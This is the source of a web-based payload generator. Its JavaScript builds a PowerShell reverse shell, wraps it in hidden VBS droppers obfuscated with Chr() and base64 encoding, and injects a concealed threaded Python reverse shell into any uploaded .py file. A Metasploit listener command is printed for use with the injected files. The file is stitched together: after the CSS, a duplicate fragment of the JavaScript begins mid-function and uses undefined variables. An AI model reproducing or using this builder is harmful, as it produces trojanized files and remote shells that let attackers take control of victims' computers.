document.addEventListener('DOMContentLoaded', function() {
    const modal = document.getElementById('modal');
    const modalTitle = document.getElementById('modal-title');
    const modalMessage = document.getElementById('modal-message');
    const modalClose = document.querySelector('.modal-close');
    const modalOk = document.getElementById('modal-ok');
    
    let currentVbsContent = '';
    
    function showModal(title, message, isError = false) {
        modalTitle.textContent = title;
        modalMessage.textContent = message;
        modal.style.display = 'flex';
        
        if (isError) {
            modalTitle.style.color = 'var(--danger)';
        } else {
            modalTitle.style.color = 'var(--secondary)';
        }
    }
    
    modalClose.addEventListener('click', () => {
        modal.style.display = 'none';
    });
    
    modalOk.addEventListener('click', () => {
        modal.style.display = 'none';
    });
    
    window.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.style.display = 'none';
        }
    });

    function validateIpOrDomain(value) {
        const ipPattern = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
        const domainPattern = /^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$/;
        const ngrokPattern = /^[a-zA-Z0-9\-]+\.tcp\.([a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,}$/;
        return ipPattern.test(value) || domainPattern.test(value) || ngrokPattern.test(value);
    }
    
    function validatePort(port) {
        return port > 0 && port <= 65535;
    }
    
    function powershellReverseShell(ip, port) {
        return (
            `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});` +
            "$stream = $client.GetStream();" +
            "$writer = New-Object System.IO.StreamWriter($stream);" +
            "$buffer = New-Object System.Byte[] 1024;" +
            "$encoding = New-Object System.Text.ASCIIEncoding;" +
            "while(($read = $stream.Read($buffer, 0, 1024)) -ne 0){" +
            "$command = $encoding.GetString($buffer, 0, $read);" +
            "$output = cmd.exe /c $command 2>&1 | Out-String;" +
            "$writer.WriteLine($output);" +
            "$writer.Flush()" +
            "}"
        );
    }
    
    function obfuscateChr(text) {
        return '""' + text.split('').map(c => ` & Chr(${c.charCodeAt(0)})`).join('');
    }
    
    function downloadFile(content, filename) {
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename.endsWith('.vbs') ? filename : `${filename}.vbs`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }
    
    document.getElementById('generate-chr').addEventListener('click', () => {
        const ip = document.getElementById('ip').value;
        const port = parseInt(document.getElementById('port').value);
        
        if (!validateIpOrDomain(ip)) {
            showModal('Error', 'Invalid IP/Domain', true);
            return;
        }
        
        if (!validatePort(port)) {
            showModal('Error', 'Port must be between 1 and 65535', true);
            return;
        }
        
        try {
            const pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)';
            const payload = powershellReverseShell(ip, port);
            const obfPayload = obfuscateChr(payload);
            currentVbsContent = (
                'Set x = CreateObject("WScript.Shell")\n' +
                `${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
            );
            
            document.getElementById('vbs-output').value = currentVbsContent;
            showModal('Success', 'VBS payload generated successfully!');
        } catch (e) {
            showModal('Error', `Error: ${e.message}`, true);
        }
    });
    
    document.getElementById('generate-b64').addEventListener('click', () => {
        const ip = document.getElementById('ip').value;
        const port = parseInt(document.getElementById('port').value);
        
        if (!validateIpOrDomain(ip)) {
            showModal('Error', 'Invalid IP/Domain', true);
            return;
        }
        
        if (!validatePort(port)) {
            showModal('Error', 'Port must be between 1 and 65535', true);
            return;
        }
        
        try {
            const payload = powershellReverseShell(ip, port);
            const encoder = new TextEncoder();
            const encoded = btoa(String.fromCharCode(...encoder.encode(payload)));
            currentVbsContent = (
                'Set shell = CreateObject("Wscript.Shell")\n' +
                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
            );
            
            document.getElementById('vbs-output').value = currentVbsContent;
            showModal('Success', 'VBS payload generated successfully!');
        } catch (e) {
            showModal('Error', `Error: ${e.message}`, true);
        }
    });
    
    document.getElementById('download-btn').addEventListener('click', () => {
        const filename = document.getElementById('filename').value || 'payload.vbs';
        
        if (!currentVbsContent) {
            showModal('Error', 'Please generate a payload first', true);
            return;
        }
        
        try {
            downloadFile(currentVbsContent, filename);
            showModal('Success', `File ${filename} downloaded successfully!`);
        } catch (e) {
            showModal('Error', `Error downloading file: ${e.message}`, true);
        }
    });
});
.btn {
    background-color: transparent;
    color: var(--text);
    border: 2px solid;
    border-radius: 5px;
    padding: 0.8rem 1.5rem;
    font-size: 0.9rem;
    cursor: pointer;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    margin-right: 1rem;
    margin-bottom: 1rem;
}

.btn::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
    transition: all 0.5s ease;
}

.btn:hover::before {
    left: 100%;
}

.btn-primary {
    border-color: var(--primary);
    color: var(--primary);
}

.btn-primary:hover {
    background-color: var(--primary);
    color: var(--bg-dark);
}

.btn-secondary {
    border-color: var(--secondary);
    color: var(--secondary);
}

.btn-secondary:hover {
    background-color: var(--secondary);
    color: var(--bg-dark);
}

.btn-accent {
    border-color: var(--accent);
    color: var(--accent);
}

.btn-accent:hover {
    background-color: var(--accent);
    color: var(--bg-dark);
}

.btn-group {
    display: flex;
    flex-wrap: wrap;
    margin: 1.5rem 0;
}

.output {
    margin-top: 1.5rem;
    background-color: var(--bg-darker);
    border: 1px solid var(--primary);
    border-radius: 5px;
    padding: 1rem;
    position: relative;
}

.output-title {
    color: var(--accent);
    margin-bottom: 0.5rem;
    font-size: 0.9rem;
}

.modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.8);
    z-index: 1000;
    justify-content: center;
    align-items: center;
    animation: fadeIn 0.3s ease;
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

.modal-content {
    background-color: var(--bg-dark);
    border: 1px solid var(--primary);
    border-radius: 5px;
    padding: 2rem;
    max-width: 500px;
    width: 90%;
    position: relative;
    animation: slideDown 0.3s ease;
}

@keyframes slideDown {
    from { transform: translateY(-50px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
}

.modal-title {
    color: var(--secondary);
    margin-bottom: 1rem;
    font-size: 1.2rem;
}

.modal-message {
    margin-bottom: 1.5rem;
    line-height: 1.5;
}

.modal-close {
    position: absolute;
    top: 1rem;
    right: 1rem;
    color: var(--text-muted);
    cursor: pointer;
    font-size: 1.5rem;
    transition: all 0.3s ease;
}

.modal-close:hover {
    color: var(--danger);
}

.modal-footer {
    display: flex;
    justify-content: flex-end;
}

.glow {
    animation: glow 2s infinite alternate;
}

@keyframes glow {
    from {
        text-shadow: 0 0 5px var(--secondary);
    }
    to {
        text-shadow: 0 0 15px var(--secondary), 0 0 20px var(--primary);
    }
}

@media (max-width: 768px) {
    .form-row {
        flex-direction: column;
        align-items: flex-start;
    }

    label {
        width: 100%;
        margin-bottom: 0.5rem;
    }

    .btn-group {
        flex-direction: column;
    }

    .btn {
        width: 100%;
        margin-right: 0;
        margin-bottom: 0.5rem;
    }
    }            "$writer.Flush()" +
            "}"
        );
    }
    
    function obfuscateChr(text) {
        return '""' + text.split('').map(c => ` & Chr(${c.charCodeAt(0)})`).join('');
    }
    
    document.getElementById('generate-chr').addEventListener('click', () => {
        const ip = document.getElementById('ip').value;
        const port = parseInt(document.getElementById('port').value);
        const file = vbsFileInput.files[0];
        
        if (!validateIpOrDomain(ip)) {
            showModal('Error', 'Invalid IP/Domain', true);
            return;
        }
        
        if (!validatePort(port)) {
            showModal('Error', 'Port must be between 1 and 65535', true);
            return;
        }
        
        if (!file) {
            showModal('Error', 'Please specify output file', true);
            return;
        }
        
        try {
            const pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)';
            const payload = powershellReverseShell(ip, port);
            const obfPayload = obfuscateChr(payload);
            const vbs = (
                'Set x = CreateObject("WScript.Shell")\n' +
                `${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
            );
            
            const blob = new Blob([vbs], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = file.name.endsWith('.vbs') ? file.name : `${file.name}.vbs`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            document.getElementById('vbs-output').value = `Successfully generated CHR method VBS:\n${file.name}\n\n${vbs}`;
            showModal('Success', 'VBS file created successfully!');
        } catch (e) {
            showModal('Error', `Error: ${e.message}`, true);
        }
    });
    
    document.getElementById('generate-b64').addEventListener('click', () => {
        const ip = document.getElementById('ip').value;
        const port = parseInt(document.getElementById('port').value);
        const file = vbsFileInput.files[0];
        
        if (!validateIpOrDomain(ip)) {
            showModal('Error', 'Invalid IP/Domain', true);
            return;
        }
        
        if (!validatePort(port)) {
            showModal('Error', 'Port must be between 1 and 65535', true);
            return;
        }
        
        if (!file) {
            showModal('Error', 'Please specify output file', true);
            return;
        }
        
        try {
            const payload = powershellReverseShell(ip, port);
            const encoder = new TextEncoder();
            const encoded = btoa(String.fromCharCode(...encoder.encode(payload)));
            const vbs = (
                'Set shell = CreateObject("Wscript.Shell")\n' +
                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
            );
            
            const blob = new Blob([vbs], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = file.name.endsWith('.vbs') ? file.name : `${file.name}.vbs`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            document.getElementById('vbs-output').value = `Successfully generated Base64 method VBS:\n${file.name}\n\n${vbs}`;
            showModal('Success', 'VBS file created successfully!');
        } catch (e) {
            showModal('Error', `Error: ${e.message}`, true);
        }
    });
    
    document.getElementById('inject-payload').addEventListener('click', async () => {
        const file = pyFileInput.files[0];
        const lhost = document.getElementById('msf-ip').value;
        const lport = parseInt(document.getElementById('msf-port').value);
        const outputDiv = document.getElementById('injector-output');
        
        if (!file) {
            showModal('Error', 'Please select a Python file', true);
            return;
        }
        
        if (!validateIpOrDomain(lhost)) {
            showModal('Error', 'Invalid LHOST', true);
            return;
        }
        
        if (!validatePort(lport)) {
            showModal('Error', 'LPORT must be between 1 and 65535', true);
            return;
        }
        
        try {
            outputDiv.innerHTML = '';
            
            const status = document.createElement('div');
            status.className = 'status status-info';
            status.innerHTML = '🔧 Creating Metasploit payload...';
            outputDiv.appendChild(status);
            
            const msfPayload = `import socket,subprocess,threading;def pty():
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("${lhost}",${lport}));
while 1:
    d=s.recv(1024);
    if len(d)==0:
        break
    p=subprocess.Popen(d.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);
    s.sendall(p.stdout.read()+p.stderr.read());
threading.Thread(target=pty,daemon=True).start()`;
            
            const reader = new FileReader();
            reader.onload = async function(e) {
                const original = e.target.result;
                const randomFn = Math.random().toString(36).substring(2, 10);
                
                const payloadFunc = [
                    `def ${randomFn}():\n`,
                    ...msfPayload.split('\n').map(line => `    ${line}\n`),
                    `\nthreading.Thread(target=${randomFn}, daemon=True).start()\n\n`
                ].join('');
                
                const finalCode = (
                    "import threading\n" +
                    payloadFunc +
                    original
                );
                
                const outputFilename = file.name.replace('.py', '_patched.py');
                const blob = new Blob([finalCode], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = outputFilename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                
                const success1 = document.createElement('div');
                success1.className = 'status status-success';
                success1.innerHTML = `✅ Payload successfully injected to '${outputFilename}'`;
                outputDiv.appendChild(success1);
                
                const success2 = document.createElement('div');
                success2.className = 'status status-info';
                success2.innerHTML = '➡️ Run Metasploit listener: msfconsole -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST ' + lhost + '; set LPORT ' + lport + '; exploit"';
                outputDiv.appendChild(success2);
                
                showModal('Success', 'Payload injected successfully!');
            };
            reader.readAsText(file);
        } catch (e) {
            showModal('Error', `Error: ${e.message}`, true);
        }
    });
});
